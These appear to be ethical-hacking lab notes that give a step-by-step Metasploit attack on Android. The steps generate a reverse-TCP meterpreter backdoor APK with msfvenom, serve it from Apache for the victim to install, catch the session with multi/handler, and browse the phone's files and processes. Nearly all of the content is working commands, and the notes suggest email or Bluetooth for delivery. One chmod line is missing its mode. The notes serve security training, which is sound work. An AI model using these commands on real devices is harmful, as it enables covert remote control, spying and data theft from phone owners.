- Attackers use various tools such as Metasploit to create binary payloads, which are sent to the target system to gain control over it.
- Meterpreter is a Metasploit attack payload that provides an interactive shell that can be used to explore target machines and execute code.
- Open Terminal
	> sudo su
	> cd
	> service postgresql start (to start database service)
	> msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST= #hostip R>Desktop/Backdoor.apk (to generate a backdoor, or reverse meterpreter application)
	- This command creates an APK (**Backdoor.apk**) on **Desktop** under the **Root** directory.

- Now, share or send the **Backdoor.apk** file to the victim machine.
	- In this task, we are sending the malicious payload through a shared directory, but in real-life cases, attackers may send it via an attachment in an email, over Bluetooth, or through some other application or means.
- To Create a shared folder
	- mkdir /var/www/html/share (to create a shared folder)
	- chmod -R /var/www/html/share 
	- chown -R www-data:www-data /var/www/html/share 

	> service apache2 start (to start apache web server)
	> cp /root/Desktop/Backdoor.apk /var/www/html/share/ (to copy Backdoor.apk file to the location share folder)
	
	> msfconsole (to launch metasploit framework)
	> use exploit/multi/handler
			> set payload android/meterpreter/reverse_tcp 
			> set LHOST #hostip 
			> show options (shows listening port)
			> exploit -j -z (runs exploit as background job)
			


- Switch to Android machine (as victim)
- browse http:// #hostip/share in browser
- The **Index of /share** page appears; click **Backdoor.apk** to download the application package file and install



- Switch back to host/attacker machine to see that the **meterpreter** session has been opened successfully.
	> sessions -i 1(meterpreter session is launched)
	
	> sysinfo (Issuing this command displays the information the target machine such as computer name, OS, etc)
	> ipconfig (to display the victim machine’s network interfaces, IP address (IPv4 and IPv6), MAC address, etc)
	
	> pwd (to view the current or present working directory on the remote (target) machine)
	> cd /sdcard (to change the current remote directory to **sdcard**)
	
	> ps (to view the current processes running in the system)
	
	- Because of poor security settings and a lack of awareness, if an individual in an organization installs a backdoor file on their device, the attacker gains control of the device. The attacker can then perform malicious activities such as uploading worms, downloading data, and spying on the user’s keystrokes, which can reveal sensitive information related to the organization as well as the victim
